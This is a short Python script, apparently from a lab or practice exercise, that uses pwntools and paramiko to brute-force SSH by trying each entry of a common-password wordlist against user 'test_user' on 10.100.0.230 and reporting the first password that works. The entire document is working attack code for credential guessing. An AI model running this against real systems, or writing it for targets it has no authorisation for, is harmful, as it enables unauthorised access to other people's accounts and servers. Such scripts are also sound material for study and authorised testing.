from pwn import *
import paramiko

host = "10.100.0.230"
username = "test_user"
attempts = 0

with open("ssh-common-passwords.txt", "r") as password_list:
	for password in password_list:
		password = password.strip("\n")
		try:
			# handle authentication errors
			print(f"[{attempts}] Attempting password: {password}")
			response = ssh(host=host, user=username, password=password, timeout=1)

			if response.connected():
				print(f"[>] Valid password found: {password}")
				response.close()
				break

			# if password was not correct close the connection as well
			response.close()

		except paramiko.ssh_exception.AuthenticationException:
			print(f"[X] Invalid password!")
		attempts += 1
